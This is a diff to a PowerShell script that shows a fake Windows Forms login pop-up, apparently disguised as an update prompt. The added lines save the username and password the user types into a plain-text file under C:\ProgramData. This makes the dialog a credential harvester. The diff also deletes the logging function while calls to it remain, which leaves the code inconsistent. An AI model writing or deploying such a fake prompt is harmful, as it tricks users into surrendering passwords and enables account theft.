@@ -1,18 +1,3 @@
-# Define the log file path for the fake update pop-up
-$logFile = "C:\ProgramData\entropygorilla.log"
-$scriptName = "FakeUpdatePopUp.ps1"
-
-# Function to log messages
-function Log-Message {
-    param (
-        [string]$message,
-        [string]$level = "INFO"
-    )
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    $logEntry = "$timestamp [$level] [$scriptName] $message"
-    Add-Content -Path $logFile -Value $logEntry
-}
-
 # Function to show a fake login page
 function Show-FakeLoginPopUp {
     Add-Type -AssemblyName System.Windows.Forms
@@ -63,15 +48,11 @@ function Show-FakeLoginPopUp {
 
     if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
         Log-Message "User logged in with username: $($usernameTextBox.Text)"
+        $credentials = "Username: $($usernameTextBox.Text)`nPassword: $($passwordTextBox.Text)"
+        $credentials | Out-File -FilePath "C:\ProgramData\Credentials.txt" -Force
         # Here you can add your logic for successful login
     } else {
         Log-Message "User cancelled the login."
         # Here you can add your logic for cancelled login
     }
 }
-
-# Log the action
-Log-Message "Displaying simulated fake login pop-up."
-
-# Show the fake login pop-up
-Show-FakeLoginPopUp
